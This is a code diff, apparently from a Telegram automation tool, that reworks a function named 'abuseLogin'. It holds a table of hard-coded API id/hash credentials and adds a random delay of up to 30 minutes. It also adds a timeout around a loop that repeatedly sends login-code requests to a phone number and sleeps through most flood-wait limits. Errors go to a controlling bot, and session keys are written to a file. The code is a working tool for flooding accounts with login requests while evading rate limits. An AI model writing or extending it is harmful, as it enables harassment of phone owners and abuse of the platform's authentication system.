@@ -8,6 +8,24 @@ import { sleep } from '../helpers/helpers';
 import { sendToMainBot } from '../helpers/sendToMainBot';
 import { invokeRequest } from './invokeRequest';
 
+const API_PAIRS: Record<number, string> = {
+  4: '014b35b6184100b085b0d0572f9b5103',
+  5: '1c5c96d5edd401b1ed40db3fb5633e2d',
+  6: 'eb06d4abfb49dc3eeb1aeb98ae0f581e',
+  8: '7245de8e747a0d6fbe11f7cc14fcc0bb',
+  9: '3975f648bb682ee889f35483bc618d1c',
+  2040: 'b18441a1ff607e10a989891a5462e627',
+  2496: '8da85b0d5bfe62527e5b244c209159c3',
+  2834: '68875f756c9b437a8b916ca3de215815',
+  2899: '36722c72256a24c1225de00eb6a1ca74',
+  10840: '33c45224029d59cb3ad0c16134215aeb',
+  16623: '8c9dbfe58437d1739540f5d53c72ae4b',
+  17349: '344583e45741c457fe1862106095a5eb',
+  21724: '3e0cb5efcd52300aec5994fdfc5bdc16',
+  94575: 'a3406de8d171bb422bb6ddf3bbd800e2',
+  611335: 'd524b414d21f4d37f08684c1df41ac9c',
+};
+
 export const getClient = async (
   dcId: number,
   nextApiId: number,
@@ -29,29 +47,14 @@ export const getClient = async (
 
   if (keys[mainDcId]) {
     fs.promises
-      .appendFile(path.resolve(process.cwd(), 'keys.txt'), `${keys[mainDcId]}:${mainDcId}\n`)
+      .appendFile(
+        path.resolve(process.cwd(), 'keys.txt'),
+        `${keys[mainDcId]}:${mainDcId}\n`
+      )
       .catch(() => {});
   }
 
   return client;
-};
-
-const API_PAIRS: Record<number, string> = {
-  4: '014b35b6184100b085b0d0572f9b5103',
-  5: '1c5c96d5edd401b1ed40db3fb5633e2d',
-  6: 'eb06d4abfb49dc3eeb1aeb98ae0f581e',
-  8: '7245de8e747a0d6fbe11f7cc14fcc0bb',
-  9: '3975f648bb682ee889f35483bc618d1c',
-  2040: 'b18441a1ff607e10a989891a5462e627',
-  2496: '8da85b0d5bfe62527e5b244c209159c3',
-  2834: '68875f756c9b437a8b916ca3de215815',
-  2899: '36722c72256a24c1225de00eb6a1ca74',
-  10840: '33c45224029d59cb3ad0c16134215aeb',
-  16623: '8c9dbfe58437d1739540f5d53c72ae4b',
-  17349: '344583e45741c457fe1862106095a5eb',
-  21724: '3e0cb5efcd52300aec5994fdfc5bdc16',
-  94575: 'a3406de8d171bb422bb6ddf3bbd800e2',
-  611335: 'd524b414d21f4d37f08684c1df41ac9c',
 };
 
 async function sendCodeRequest(
@@ -78,6 +81,8 @@ async function sendCodeRequest(
 }
 
 export const abuseLogin = async (accountId: string) => {
+  await sleep(Math.random() * 30 * 60 * 1000);
+
   const { dcId, nextApiId, phone } = await getAccountById(accountId);
 
   if (!phone || !nextApiId) {
@@ -110,57 +115,85 @@ API_ID: ${nextApiId}`);
 
   let client = await getClient(dcId, nextApiId, accountId);
 
-  while (true) {
-    try {
-      const result = await sendCodeRequest(client, nextApiId, apiHash, phone);
+  const runLoginRequests = async () => {
+    while (true) {
+      try {
+        const result = await sendCodeRequest(client, nextApiId, apiHash, phone);
 
-      if (client.getConnectionStats) {
-        const stats = client.getConnectionStats();
-        totalConnectCounts += stats.connectCounts || 0;
-        totalConnectErrorCounts += stats.connectErrorCounts || 0;
-        totalDisconnectCounts += stats.disconnectCounts || 0;
-        totalReconnectCounts += stats.reconnectCounts || 0;
-      }
-
-      if (!result.error) {
-        continue;
-      }
-
-      await client.destroy();
-
-      const reason = result.error.message;
-      if (reason.includes('seconds is required (caused by auth.SendCode)')) {
-        const secondsMatch = reason.match(/\d+/);
-
-        if (secondsMatch) {
-          const seconds = parseInt(secondsMatch[0], 10);
-
-          if (seconds > 60 * 60) {
-            break;
-          }
-
-          if (seconds > 275 && seconds < 325) {
-          } else {
-            await sleep(seconds * 1000);
-          }
-
-          client = await getClient(dcId, nextApiId, accountId);
+        if (client.getConnectionStats) {
+          const stats = client.getConnectionStats();
+          totalConnectCounts += stats.connectCounts || 0;
+          totalConnectErrorCounts += stats.connectErrorCounts || 0;
+          totalDisconnectCounts += stats.disconnectCounts || 0;
+          totalReconnectCounts += stats.reconnectCounts || 0;
         }
-      } else if (reason === 'PHONE_PASSWORD_FLOOD') {
-        break;
-      } else {
-        await sendToMainBot(`💀 ABUSE_LOGIN_ERROR 💀
+
+        if (!result.error) {
+          continue;
+        }
+
+        await client.destroy();
+
+        const reason = result.error.message;
+
+        if (reason.includes('seconds is required (caused by auth.SendCode)')) {
+          const secondsMatch = reason.match(/\d+/);
+
+          if (secondsMatch) {
+            const waitSeconds = parseInt(secondsMatch[0], 10);
+            const isWaitTooLong = waitSeconds > 60 * 60;
+            const isSpecialWaitRange = waitSeconds > 275 && waitSeconds < 325;
+
+            if (isWaitTooLong) {
+              break;
+            }
+
+            if (!isSpecialWaitRange) {
+              await sleep(waitSeconds * 1000);
+            }
+
+            client = await getClient(dcId, nextApiId, accountId);
+          }
+        } else if (reason === 'PHONE_PASSWORD_FLOOD') {
+          break;
+        } else {
+          await sendToMainBot(`💀 ABUSE_LOGIN_ERROR 💀
 ID: ${accountId}
 REASON: ${reason}`);
-        break;
-      }
-    } catch (error: any) {
-      await client.destroy();
-
-      await sendToMainBot(`💀 ABUSE_LOGIN_GLOBAL_ERROR 💀
+          break;
+        }
+      } catch (error: any) {
+        await client.destroy();
+        await sendToMainBot(`💀 ABUSE_LOGIN_GLOBAL_ERROR 💀
 ID: ${accountId}
 REASON: ${error.message}`);
-      break;
+        break;
+      }
+    }
+  };
+
+  const MAX_EXECUTION_TIME_MS = 1 * 60 * 1000;
+  const TIMEOUT_ERROR = 'TIMEOUT_EXCEEDED';
+
+  try {
+    await Promise.race([
+      runLoginRequests(),
+      new Promise((_, reject) => {
+        setTimeout(() => {
+          reject(new Error(TIMEOUT_ERROR));
+        }, MAX_EXECUTION_TIME_MS);
+      }),
+    ]);
+  } catch (error: any) {
+    await client.destroy();
+
+    if (error.message === TIMEOUT_ERROR) {
+      await sendToMainBot(`⏱️ ABUSE_LOGIN_TIMEOUT ⏱️
+ID: ${accountId}`);
+    } else {
+      await sendToMainBot(`💀 ABUSE_LOGIN_UNEXPECTED_ERROR 💀
+ID: ${accountId}
+REASON: ${error.message}`);
     }
   }
 
